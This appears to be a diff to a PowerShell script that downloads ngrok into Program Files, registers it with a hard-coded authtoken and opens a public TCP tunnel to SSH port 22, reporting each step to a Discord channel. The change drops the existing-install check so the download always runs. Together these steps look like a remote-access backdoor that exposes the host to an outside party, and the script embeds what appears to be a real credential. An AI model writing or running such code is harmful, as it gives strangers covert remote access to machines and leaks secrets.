@@ -66,24 +66,18 @@ try {
 
     # Install ngrok if not installed
     Send-DiscordMessage "Checking for ngrok installation..."
-    if (-not (Get-Command ngrok -ErrorAction SilentlyContinue)) {
-        Send-DiscordMessage "ngrok not found. Installing ngrok..."
-        Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile "$env:TEMP\ngrok.zip"
-        Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:ProgramFiles"
-        Remove-Item "$env:TEMP\ngrok.zip"
-        Send-DiscordMessage "ngrok installed successfully."
-    } else {
-        Send-DiscordMessage "ngrok already installed."
-    }
+    Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile "$env:TEMP\ngrok.zip"
+    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:ProgramFiles"
+    Remove-Item "$env:TEMP\ngrok.zip"
+    Send-DiscordMessage "ngrok installed successfully."
 
-    # Explicitly define the path to ngrok executable
-
-    # Enter your ngrok authtoken here (with your actual token)
+    # Set up ngrok with authtoken (replace with your actual authtoken)
     $NgrokAuthToken = "2WU1ah9rzwH5TgeVVhhajS9IqM3_4mALPaeeqrwccVETjceEb"
+    & "$env:ProgramFiles\ngrok.exe" authtoken $NgrokAuthToken
 
     # Start ngrok tunnel
     Send-DiscordMessage "Setting up SSH tunnel using ngrok..."
-    $TunnelProcess = Start-Process -FilePath $NgrokPath -ArgumentList "tcp", "22" -PassThru
+    $TunnelProcess = Start-Process -FilePath "$env:ProgramFiles\ngrok.exe" -ArgumentList "tcp", "22" -PassThru
     $TunnelProcess.WaitForExit()
 
     # Capture the public URL from ngrok (output of the command)
